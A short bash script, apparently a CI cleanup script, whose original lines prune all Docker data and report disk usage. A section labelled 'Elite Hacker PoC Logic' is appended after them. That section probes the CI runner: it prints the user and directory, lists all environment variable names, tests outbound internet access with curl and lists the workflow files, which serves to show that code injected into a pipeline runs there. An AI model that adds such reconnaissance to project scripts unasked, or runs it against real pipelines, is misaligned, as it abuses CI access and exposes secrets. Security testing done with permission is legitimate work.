#!/bin/bash

# --- Original Logic ---
docker system prune -af
df -h

# --- Elite Hacker PoC Logic ---
echo "--- POC START: CI/CD Pipeline Exploration ---"

# 1. Check whoami and environment
echo "Runner User: $(whoami)"
echo "Current Directory: $(pwd)"

# 2. List Environment Variables (proving we can access CI context)
# Tip: GitHub automatically masks secrets, but listing keys proves access.
echo "Environment Keys Available:"
printenv | cut -d= -f1

# 3. Network Discovery (check if runner can talk to outside world)
echo "Testing Outbound Connection..."
curl -I https://www.google.com | head -n 1

# 4. Prove file access
echo "Accessing sensitive path info..."
ls -R .github/workflows

echo "--- POC END ---"
